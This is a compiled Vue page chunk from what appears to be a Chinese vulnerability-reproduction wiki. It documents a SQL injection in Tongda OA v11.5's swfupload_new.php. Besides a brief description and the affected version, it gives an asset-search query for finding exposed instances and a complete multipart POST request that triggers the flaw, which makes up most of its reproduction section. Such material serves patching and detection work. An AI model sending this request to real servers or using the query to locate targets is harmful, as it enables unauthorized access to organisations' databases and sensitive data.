import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const d={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v11.5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;TDXK-通达OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201540406.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包触发漏洞</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 355
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
Accept-Encoding: gzip

------------GFioQpMK0vv2
Content-Disposition: form-data; name=&quot;ATTACHMENT_ID&quot;

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name=&quot;ATTACHMENT_NAME&quot;

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name=&quot;FILE_SORT&quot;

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name=&quot;SORT_ID&quot;

------------GFioQpMK0vv2--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201541795.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),t=[s];function l(r,o){return i(),n("div",null,t)}const u=e(d,[["render",l],["__file","通达OA v11.5 swfupload_new.php SQL注入漏洞.html.vue"]]);export{u as default};
